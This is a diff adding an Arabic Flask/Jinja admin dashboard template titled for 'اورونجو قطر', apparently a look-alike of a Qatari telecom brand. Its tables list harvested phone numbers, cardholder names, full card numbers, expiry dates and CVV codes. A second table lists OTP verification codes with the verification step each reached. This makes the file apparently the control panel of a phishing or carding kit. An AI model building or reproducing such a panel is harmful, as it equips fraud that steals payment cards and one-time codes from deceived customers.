@@ -1,0 +1,223 @@
+{% extends 'base.html' %}
+
+{% block title %}لوحة تحكم المسؤول - اورونجو قطر{% endblock %}
+
+{% block styles %}
+<style>
+    .admin-header {
+        background-color: #E60000;
+        color: white;
+        padding: 15px;
+        border-radius: 5px;
+        margin-bottom: 20px;
+    }
+    
+    .admin-header h1 {
+        font-weight: bold;
+        margin-bottom: 0;
+    }
+    
+    .admin-logout {
+        text-align: left;
+    }
+    
+    .admin-logout a {
+        color: white;
+        text-decoration: none;
+    }
+    
+    .admin-logout a:hover {
+        text-decoration: underline;
+    }
+    
+    .card {
+        margin-bottom: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        border: none;
+    }
+    
+    .card-header {
+        background-color: #f8f9fa;
+        border-bottom: 2px solid #E60000;
+        font-weight: bold;
+        padding: 15px;
+    }
+    
+    .table {
+        margin-bottom: 0;
+    }
+    
+    .table th {
+        background-color: #f8f9fa;
+        font-weight: bold;
+    }
+    
+    .status-pending {
+        color: #ffc107;
+        font-weight: bold;
+    }
+    
+    .status-completed {
+        color: #28a745;
+        font-weight: bold;
+    }
+    
+    .status-failed {
+        color: #dc3545;
+        font-weight: bold;
+    }
+    
+    .card-count {
+        font-size: 2.5rem;
+        font-weight: bold;
+        color: #E60000;
+        text-align: center;
+    }
+    
+    .card-title {
+        color: #444;
+        font-weight: bold;
+        text-align: center;
+    }
+    
+    .summary-card {
+        transition: all 0.3s ease;
+    }
+    
+    .summary-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container my-4">
+    <!-- رأس الصفحة -->
+    <div class="admin-header d-flex justify-content-between align-items-center">
+        <h1>لوحة تحكم المسؤول</h1>
+        <div class="admin-logout">
+            <a href="{{ url_for('admin_logout') }}">تسجيل الخروج <i class="fas fa-sign-out-alt"></i></a>
+        </div>
+    </div>
+    
+    {% with messages = get_flashed_messages(with_categories=true) %}
+        {% if messages %}
+            {% for category, message in messages %}
+                <div class="alert alert-{{ category }}">{{ message }}</div>
+            {% endfor %}
+        {% endif %}
+    {% endwith %}
+    
+    <!-- ملخص البيانات -->
+    <div class="row mb-4">
+        <div class="col-md-4">
+            <div class="card summary-card">
+                <div class="card-body">
+                    <div class="card-count">{{ card_data|length }}</div>
+                    <div class="card-title">عدد عمليات الدفع</div>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-4">
+            <div class="card summary-card">
+                <div class="card-body">
+                    <div class="card-count">{{ verification_codes|length }}</div>
+                    <div class="card-title">عدد رموز التحقق</div>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-4">
+            <div class="card summary-card">
+                <div class="card-body">
+                    <div class="card-count">{{ verification_codes|selectattr('verified_at', 'defined')|list|length }}</div>
+                    <div class="card-title">عمليات التحقق المكتملة</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- بيانات البطاقات -->
+    <div class="card">
+        <div class="card-header">
+            بيانات بطاقات الدفع
+        </div>
+        <div class="card-body p-0">
+            <div class="table-responsive">
+                <table class="table table-striped">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>رقم الهاتف</th>
+                            <th>اسم صاحب البطاقة</th>
+                            <th>رقم البطاقة (كامل)</th>
+                            <th>تاريخ الانتهاء</th>
+                            <th>رمز CVV</th>
+                            <th>المبلغ</th>
+                            <th>تاريخ العملية</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for card in card_data %}
+                        <tr>
+                            <td>{{ card.id }}</td>
+                            <td>{{ card.mobile_number }}</td>
+                            <td>{{ card.cardholder_name }}</td>
+                            <td>{{ card.card_number }}</td>
+                            <td>{{ card.expiry_date }}</td>
+                            <td>{{ card.cvv }}</td>
+                            <td>{{ card.amount }} ر.ق</td>
+                            <td>{{ card.created_at.strftime('%Y-%m-%d %H:%M') }}</td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="8" class="text-center">لا توجد بيانات بطاقات حتى الآن</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <!-- رموز التحقق -->
+    <div class="card">
+        <div class="card-header">
+            رموز التحقق
+        </div>
+        <div class="card-body p-0">
+            <div class="table-responsive">
+                <table class="table table-striped">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>معرف البطاقة</th>
+                            <th>رمز التحقق</th>
+                            <th>خطوة التحقق</th>
+                            <th>تاريخ الإنشاء</th>
+                            <th>تاريخ التحقق</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for code in verification_codes %}
+                        <tr>
+                            <td>{{ code.id }}</td>
+                            <td>{{ code.card_data_id }}</td>
+                            <td>{{ code.otp_code }}</td>
+                            <td>{{ code.otp_step }}</td>
+                            <td>{{ code.created_at.strftime('%Y-%m-%d %H:%M') }}</td>
+                            <td>{{ code.verified_at.strftime('%Y-%m-%d %H:%M') if code.verified_at else '-' }}</td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="6" class="text-center">لا توجد رموز تحقق حتى الآن</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
